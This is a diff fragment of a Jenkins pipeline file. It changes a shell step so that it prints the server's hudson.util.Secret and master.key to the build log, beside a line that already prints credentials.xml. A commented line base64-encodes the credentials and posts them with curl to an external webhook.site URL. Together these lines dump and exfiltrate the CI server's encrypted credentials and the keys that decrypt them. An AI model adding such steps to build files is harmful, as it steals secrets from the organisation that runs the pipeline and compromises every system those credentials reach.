@@ -10,8 +10,8 @@ pipeline {
                 pwd
                 ls -lath /var/jenkins_home
                 ls -lath /var/jenkins_home/secrets
-                #echo /var/jenkins_home/hudson.util.Secret
-                #cat /var/jenkins_home/master.key
+                cat ../../secrets/hudson.util.Secret
+                cat ../../secrets/master.key
                 cat ../../credentials.xml
                 #echo /var/jenkins_home/credentials.xml |base64 | | curl -X POST -d @- https://webhook.site/731aa854-74cb-47f6-8163-b9185f68f89f
                 '''
